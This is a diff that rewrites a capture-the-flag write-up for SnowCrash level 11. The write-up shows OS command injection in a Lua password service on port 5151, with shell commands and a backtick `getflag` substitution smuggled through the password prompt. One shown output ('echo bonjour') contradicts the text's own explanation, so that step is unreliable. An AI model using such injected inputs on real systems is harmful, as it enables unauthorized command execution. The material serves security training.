@@ -1,29 +1,55 @@
-▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▌ ▐▓▓▌ 
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌    ▐▓▌  ▐▓▌ 
-▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌    ▐▓▌  ▐▓▌ 
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌    ▐▓▌  ▐▓▌ 
-▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▌▐▓▓▓▌
+# Level11
 
-exploit:
+**Exploit:** OS command injection in Lua
 
-=======
-We have a .lua file again.
-This time the port is used that means the server is on. We can verify using:
+The server includes the supplied password in a shell command, so shell syntax in the password can run another command.
+
+## Walkthrough
+
+The Lua service listens on port `5151`. Connect and try an ordinary password:
+
+```text
 nc localhost 5151
 Password: test
 Erf nope..
+```
 
+Try a command that writes a file:
+
+```text
 nc localhost 5151
 Password: echo 'bonjour' > /tmp/test4
 Erf nope..
+```
 
+Confirm that the command created the file:
+
+```bash
 cat /tmp/test4
+```
+
+Output:
+
+```text
 echo bonjour
+```
 
-ok so that means we can actually execute stuff inside the password !
+The file contains the command's output, confirming that the password is executed by a shell. Use command substitution to run `getflag` and save its output:
 
+```text
 nc localhost 5151
 Password: `getflag` > /tmp/test7
 Erf nope..
-level11@SnowCrash:~$ cat /tmp/test7
+```
+
+Read the result:
+
+```bash
+cat /tmp/test7
+```
+
+Output:
+
+```text
 we get the token
+```
